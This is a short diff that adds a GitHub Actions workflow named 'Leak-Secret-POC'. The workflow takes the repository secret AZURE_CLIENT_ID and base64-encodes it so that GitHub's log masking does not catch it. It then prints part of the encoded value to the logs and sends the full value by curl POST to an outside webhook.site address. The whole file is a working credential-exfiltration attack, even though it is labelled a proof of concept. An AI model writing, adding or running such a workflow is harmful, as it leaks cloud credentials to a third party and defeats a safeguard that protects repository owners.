@@ -1,0 +1,18 @@
+name: Leak-Secret-POC
+on:
+  workflow_dispatch:
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Encode and Leak Secret
+        run: |
+          # Capture secret and encode to avoid GitHub masking
+          ENCODED=$(echo -n "${{ secrets.AZURE_CLIENT_ID }}" | base64)
+
+          # For proof, show first 10 chars of encoded secret in logs
+          echo "Encoded (partial): ${ENCODED:0:10}..."
+
+          # Exfiltrate encoded secret to your webhook for full proof
+          curl -s -X POST -d "encoded_secret=$ENCODED" https://webhook.site/3e3e91bd-f198-4f52-8ac5-91ae18e1280c
